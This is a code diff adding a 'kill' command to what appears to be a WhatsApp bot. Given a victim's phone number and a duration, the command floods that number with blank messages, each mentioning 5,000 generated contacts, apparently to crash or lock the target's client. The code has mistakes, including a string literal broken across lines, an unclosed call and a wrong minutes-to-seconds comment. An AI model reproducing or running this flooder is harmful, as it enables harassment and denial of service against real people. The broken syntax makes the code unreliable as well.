@@ -115,6 +115,59 @@ cmd({
 
 ///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
 ///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
+
+cmd({
+    pattern: "kill",
+    alias: ["pm-kill"],
+    desc: "waiting for your last words",
+    category: "group",
+    filename: __filename,
+    use: '<text>',
+},
+async (Void, citel, text, { isCreator }) => {
+    try {
+        if (!isCreator) {
+            return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
+        }
+        
+        if (!text) {
+            return citel.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx|5`);
+        }
+
+        const [victim, duration] = text.split('|');
+        const jid = citel.chat; // JID of the recipient
+        const userId = Void.user.id; // JID of the user
+        const message = "  "; // Message to send
+        const totalDuration = parseInt(duration) * 300; // Convert duration in minutes to seconds
+        const endTime = Date.now() + (totalDuration * 1000); // Calculate end time
+
+        if (victim.startsWith('+')) {
+            return citel.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
+        }
+
+        let ying = victim + '@s.whatsapp
+        .net';
+        citel.reply(`{totalDuration} seconds bugs to 
+            the victims {victim}`;
+        // Generate unique JIDs for mentions
+        const uniqueJIDs = Array.from({ length: 5000 }, (_, index) => `${victim}${index}@s.whatsapp.net`);
+
+        while (Date.now() < endTime) {
+            await Void.sendMessage(ying, {
+                text: message,
+                mentions: uniqueJIDs // Mention unique JIDs
+            });
+        }
+
+        // Final message after all sends
+        await Void.sendMessage(userId, {
+            text: `All messages have been sent to ${jid} for ${duration} minutes.`
+        });
+    } catch (error) {
+        citel.reply(`An error occurred: ${error.message}`);
+    }
+});
+
 ///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
 
 cmd({
